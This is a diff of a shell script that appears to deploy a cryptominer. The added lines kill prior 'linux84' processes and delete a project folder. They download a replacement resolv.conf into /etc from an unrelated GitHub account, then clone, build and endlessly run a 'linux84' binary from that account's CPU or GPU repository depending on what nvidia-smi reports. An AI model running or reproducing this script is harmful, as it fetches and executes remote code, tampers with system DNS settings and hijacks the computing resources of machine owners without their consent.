@@ -1,16 +1,19 @@
 pkill -f linux84
+pkill -f linux84
+pkill -f linux84
+pkill -f linux84
+pkill -f linux84
+pkill -f linux84
+pkill -f linux84
+pkill -f linux84
+
+rm -rf /mnt/disks/user/project/linux8474/
 
 apt-get update
 
-apt-get -y install gcc
+cd /etc/
 
-apt-get -y install g++
-
-apt-get -y install apt-transport-https curl
-
-apt-get -y install make
-
-apt-get install -y cmake
+wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
 
 rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
@@ -36,10 +39,38 @@ rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubunt
 
 rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
+google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
+
+if [[ $google84121274 == *"failed"* ]]; then
+
 git clone https://github.com/mobileapps84741274/linuxcpu84
 cd linuxcpu84
 mkdir build
 cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_CUDA:BOOL="0"
 make
+
+while true
+do
+
 ./linux84 8
+
+done
+
+else
+
+git clone https://github.com/mobileapps84741274/linux84742
+cd linux84742
+mkdir build
+cd build
+cmake .. -DCMAKE_BUILD_TYPE=Release
+make
+
+while true
+do
+
+./linux84 8
+
+done
+
+fi
